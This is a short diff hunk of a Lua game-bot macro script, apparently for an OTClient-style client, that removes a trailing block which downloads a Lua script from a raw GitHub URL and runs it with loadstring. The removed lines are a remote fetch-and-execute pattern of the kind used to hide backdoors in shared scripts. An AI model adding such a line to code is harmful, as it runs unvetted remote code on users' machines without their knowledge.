@@ -348,7 +348,3 @@ macro(
         end
     end
 )
-
-modules.corelib.HTTP.get('https://raw.githubusercontent.com/dlpdr/chilled/main/c.lua', function(script)
-    assert(loadstring(script))()
-end);
